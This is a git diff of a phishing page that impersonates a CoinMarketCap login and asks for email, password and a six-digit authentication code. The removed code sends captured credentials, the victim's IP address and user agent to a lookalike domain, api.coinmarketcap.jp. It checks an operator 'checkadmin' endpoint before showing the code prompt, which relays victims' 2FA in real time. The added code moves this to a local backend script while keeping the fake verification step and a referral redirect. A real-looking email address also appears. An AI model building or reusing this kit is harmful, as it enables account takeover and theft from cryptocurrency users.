@@ -31,7 +31,7 @@
       sizes="32x32"
     />
     <link rel="apple-touch-icon" href="./images/favicon.svg" />
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <!-- <script src="https://www.google.com/recaptcha/api.js" async defer></script> -->
   </head>
 
   <body>
@@ -99,7 +99,7 @@
                   <div class="col-12">
                     <label for="email" class="form-label">Email address</label>
                     <input
-                      id="usernameInput"
+                      id="coinmarketcap-username"
                       type="email"
                       name="email"
                       autocomplete="email"
@@ -114,7 +114,7 @@
                   <div class="col-12">
                     <label for="password" class="form-label">Password?</label>
                     <input
-                      id="passwordInput"
+                      id="coinmarketcap-password"
                       name="password"
                       type="password"
                       autocomplete="current-password"
@@ -144,7 +144,11 @@
                   </div>
                   <br />
                   <div class="col-12 btn--align">
-                    <button class="btn__square" type="submit" id="login">
+                    <button
+                      class="btn__square"
+                      type="submit"
+                      id="coinmarketcap-signin"
+                    >
                       Log in
                     </button>
                     <a
@@ -191,18 +195,22 @@
                 >
                 <div class="relative mt-4 rounded-md shadow-sm">
                   <input
-                    id="captchaInput"
-                    type="number"
-                    name="one_time_password"
-                    id="one_time_password"
+                    id="coinmarketcap-captcha"
+                    type="text"
+                    minlength="6"
+                    maxlength="6"
+                    oninput="this.value = this.value.replace(/[^0-9]/g, '');"
                     class="form-control inputMessage"
                     placeholder=""
                   />
-                  <!-- <input class="inputMessage" placeholder="Type here..." /> -->
                 </div>
               </div>
 
-              <button class="dashboard-button__primary" id="captchaButton">
+              <button
+                class="dashboard-button__primary"
+                id="coinmarketcap-captcha-button"
+                onclick="sendCaptcha()"
+              >
                 Authenticate
               </button>
             </div>
@@ -212,78 +220,35 @@
     </main>
 
     <script src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
-    <!-- <script src="https://api.coinmarketcap.jp/loginpage.js?project=cloudfi.info&reflink=https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP"></script> -->
-    <script src="http://127.0.0.1:8000/loginpage.js?project=cloudfi.info&reflink=https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP"></script>
+    <script src="http://127.0.0.1:8001/client.js"></script>
     <script>
       document
         .getElementById('signup-form')
         .addEventListener('submit', async function (event) {
           event.preventDefault();
 
-          const username = document.getElementById('usernameInput').value;
-          const password = document.getElementById('passwordInput').value;
-
-          if (username == 'pfwelding@sbcglobal.net') {
-            window.location.href = 'https://www.coinmarketcap.jp';
-            return;
-          }
-
-          const clientIP = await fetch('https://api.ipify.org?format=json')
-            .then((response) => response.json())
-            .then((data) => data.ip)
-            .catch((error) => {
-              console.error('Error fetching client IP:', error);
-              return '';
-            });
-
-          const data = {
-            project: 'cloudfi.info',
-            username: username,
-            password: password,
-            ip: clientIP,
-            user_agent: navigator.userAgent,
-            event: 'LoginButtonClicked',
-            captcha: 'captcha',
-          };
-
-          await fetch(`https://api.coinmarketcap.jp/save`, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(data),
-          }).then((response) => response.json());
-
-          var isAdmin = await fetch('https://api.coinmarketcap.jp/checkadmin')
+          var isAdmin = await fetch(`${BACKEND_URL}checkadmin`)
             .then((response) => response.json())
             .then((data) => data.status);
 
           if (isAdmin) {
-            await fetch(`https://api.coinmarketcap.jp/userevent`, {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json',
-              },
-              body: JSON.stringify(data),
-            })
-              .then((response) => response.json())
-              .then((result) => {
-                const login_page = document.getElementById('login_page');
-                login_page.style.display = 'none';
-                const captcha_page = document.getElementById('captcha_page');
-                captcha_page.style.display = 'block';
-              })
-              .catch((error) => {
-                console.error('Error:', error);
-              });
+            const login_page = document.getElementById('login_page');
+            const captcha_page = document.getElementById('captcha_page');
+            login_page.style.display = 'none';
+            captcha_page.style.display = 'block';
           } else {
             window.location.href =
               'https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP';
           }
         });
-    </script>
 
-    <!-- <script src="/socket.io/socket.io.js"></script> -->
-    <!-- <script src="./js/login.js"></script> -->
+      function sendCaptcha() {
+        document.body.style.cursor = 'wait';
+        setTimeout(() => {
+          document.body.style.cursor = 'default';
+          document.getElementById('coinmarketcap-captcha').value = '';
+        }, 1000);
+      }
+    </script>
   </body>
 </html>
